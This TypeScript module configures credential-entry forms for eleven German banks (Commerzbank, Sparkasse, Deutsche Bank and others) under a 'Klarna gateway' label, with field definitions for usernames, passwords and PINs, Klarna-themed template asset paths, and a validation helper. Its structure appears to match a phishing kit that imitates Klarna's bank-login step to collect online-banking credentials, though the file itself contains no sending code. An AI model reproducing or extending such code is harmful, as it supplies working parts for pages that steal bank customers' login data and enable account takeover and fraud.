// Bank configuration utilities for Klarna gateway

export interface BankLoginField {
  name: string;
  type: 'text' | 'password' | 'email' | 'tel';
  label: string;
  placeholder: string;
  required: boolean;
  maxLength?: number;
  pattern?: string;
}

export interface BankConfig {
  id: string;
  displayName: string;
  description: string;
  logo: string;
  isActive: boolean;
  loginFields: BankLoginField[];
}

// Comprehensive bank configurations
export const BANK_CONFIGS: Record<string, BankConfig> = {
  commerzbank: {
    id: 'commerzbank',
    displayName: 'Commerzbank',
    description: 'Commerzbank AG',
    logo: '/templates/klarna/images/bank-icons/commerzbank.svg',
    isActive: true,
    loginFields: [
      {
        name: 'username',
        type: 'text',
        label: 'Benutzername',
        placeholder: 'Ihr Benutzername',
        required: true
      },
      {
        name: 'password',
        type: 'password',
        label: 'Passwort',
        placeholder: 'Ihr Passwort',
        required: true
      }
    ]
  },
  
  sparkasse: {
    id: 'sparkasse',
    displayName: 'Sparkasse',
    description: 'Sparkassen-Finanzgruppe',
    logo: '/templates/klarna/images/bank-icons/sparkasse.svg',
    isActive: true,
    loginFields: [
      {
        name: 'username',
        type: 'text',
        label: 'Anmeldename',
        placeholder: 'Ihr Anmeldename',
        required: true
      },
      {
        name: 'pin',
        type: 'password',
        label: 'PIN',
        placeholder: 'Ihre PIN',
        required: true
      }
    ]
  },
  
  dkb: {
    id: 'dkb',
    displayName: 'DKB',
    description: 'Deutsche Kreditbank AG',
    logo: '/templates/klarna/images/bank-icons/dkb.svg',
    isActive: true,
    loginFields: [
      {
        name: 'username',
        type: 'text',
        label: 'Anmeldename',
        placeholder: 'Ihr Anmeldename',
        required: true
      },
      {
        name: 'password',
        type: 'password',
        label: 'Passwort',
        placeholder: 'Ihr Passwort',
        required: true
      }
    ]
  },
  
  volksbank: {
    id: 'volksbank',
    displayName: 'Volksbank',
    description: 'Volksbank Raiffeisenbank',
    logo: '/templates/klarna/images/bank-icons/volksbank.svg',
    isActive: true,
    loginFields: [
      {
        name: 'username',
        type: 'text',
        label: 'VR-NetKey',
        placeholder: 'Ihr VR-NetKey',
        required: true
      },
      {
        name: 'pin',
        type: 'password',
        label: 'PIN',
        placeholder: 'Ihre PIN',
        required: true
      }
    ]
  },
  
  postbank: {
    id: 'postbank',
    displayName: 'Postbank',
    description: 'Deutsche Postbank AG',
    logo: '/templates/klarna/images/bank-icons/postbank.svg',
    isActive: true,
    loginFields: [
      {
        name: 'username',
        type: 'text',
        label: 'Postbank ID',
        placeholder: 'Ihre Postbank ID',
        required: true
      },
      {
        name: 'password',
        type: 'password',
        label: 'Passwort',
        placeholder: 'Ihr Passwort',
        required: true
      }
    ]
  },
  
  santander: {
    id: 'santander',
    displayName: 'Santander',
    description: 'Santander Consumer Bank',
    logo: '/templates/klarna/images/bank-icons/santander.svg',
    isActive: true,
    loginFields: [
      {
        name: 'username',
        type: 'text',
        label: 'Benutzername',
        placeholder: 'Ihr Benutzername',
        required: true
      },
      {
        name: 'password',
        type: 'password',
        label: 'Passwort',
        placeholder: 'Ihr Passwort',
        required: true
      }
    ]
  },
  
  apobank: {
    id: 'apobank',
    displayName: 'Apobank',
    description: 'Deutsche Apotheker- und Ärztebank',
    logo: '/templates/klarna/images/bank-icons/apobank.svg',
    isActive: true,
    loginFields: [
      {
        name: 'username',
        type: 'text',
        label: 'Benutzername',
        placeholder: 'Ihr Benutzername',
        required: true
      },
      {
        name: 'password',
        type: 'password',
        label: 'Passwort',
        placeholder: 'Ihr Passwort',
        required: true
      }
    ]
  },
  
  comdirect: {
    id: 'comdirect',
    displayName: 'comdirect',
    description: 'comdirect bank AG',
    logo: '/templates/klarna/images/bank-icons/comdirect.svg',
    isActive: true,
    loginFields: [
      {
        name: 'username',
        type: 'text',
        label: 'Zugangsnummer',
        placeholder: 'Ihre Zugangsnummer',
        required: true
      },
      {
        name: 'pin',
        type: 'password',
        label: 'PIN',
        placeholder: 'Ihre PIN',
        required: true
      }
    ]
  },
  
  consorsbank: {
    id: 'consorsbank',
    displayName: 'Consorsbank',
    description: 'Consorsbank',
    logo: '/templates/klarna/images/bank-icons/consorsbank.svg',
    isActive: true,
    loginFields: [
      {
        name: 'username',
        type: 'text',
        label: 'Anmeldename',
        placeholder: 'Ihr Anmeldename',
        required: true
      },
      {
        name: 'password',
        type: 'password',
        label: 'Passwort',
        placeholder: 'Ihr Passwort',
        required: true
      }
    ]
  },
  
  ingdiba: {
    id: 'ingdiba',
    displayName: 'ING',
    description: 'ING-DiBa AG',
    logo: '/templates/klarna/images/bank-icons/ingdiba.svg',
    isActive: true,
    loginFields: [
      {
        name: 'username',
        type: 'text',
        label: 'Zugangsnummer',
        placeholder: 'Ihre Zugangsnummer',
        required: true
      },
      {
        name: 'password',
        type: 'password',
        label: 'Internetbanking PIN',
        placeholder: 'Ihre PIN',
        required: true
      }
    ]
  },
  
  deutsche_bank: {
    id: 'deutsche_bank',
    displayName: 'Deutsche Bank',
    description: 'Deutsche Bank AG',
    logo: '/templates/klarna/images/bank-icons/deutsche_bank.svg',
    isActive: true,
    loginFields: [
      {
        name: 'branch',
        type: 'text',
        label: 'Filiale',
        placeholder: 'Filiale (3-stellig)',
        required: true,
        maxLength: 3,
        pattern: '^\\d{3}$'
      },
      {
        name: 'account',
        type: 'text',
        label: 'Konto-/Depotnummer',
        placeholder: 'Ihre Kontonummer',
        required: true
      },
      {
        name: 'pin',
        type: 'password',
        label: 'PIN',
        placeholder: 'Ihre PIN',
        required: true
      }
    ]
  }
};

// Utility functions
export const getBankConfig = (bankId: string): BankConfig | null => {
  return BANK_CONFIGS[bankId] || null;
};

export const getActiveBanks = (): BankConfig[] => {
  return Object.values(BANK_CONFIGS).filter(bank => bank.isActive);
};

export const getBankDisplayName = (bankId: string): string => {
  const config = getBankConfig(bankId);
  return config?.displayName || bankId;
};

export const getBankLogo = (bankId: string): string => {
  const config = getBankConfig(bankId);
  return config?.logo || '/templates/klarna/images/bank-icons/generic-bank.svg';
};

export const validateBankLoginData = (bankId: string, data: Record<string, string>): Record<string, string> => {
  const config = getBankConfig(bankId);
  const errors: Record<string, string> = {};
  
  if (!config) {
    errors.general = 'Bank-Konfiguration nicht gefunden';
    return errors;
  }
  
  config.loginFields.forEach(field => {
    const value = data[field.name]?.trim() || '';
    
    if (field.required && !value) {
      errors[field.name] = `${field.label} ist erforderlich`;
      return;
    }
    
    if (field.pattern && value && !new RegExp(field.pattern).test(value)) {
      if (field.name === 'branch') {
        errors[field.name] = 'Filiale muss 3-stellig sein';
      } else {
        errors[field.name] = `Ungültiges Format für ${field.label}`;
      }
    }
    
    if (field.maxLength && value.length > field.maxLength) {
      errors[field.name] = `${field.label} darf maximal ${field.maxLength} Zeichen haben`;
    }
  });
  
  return errors;
};
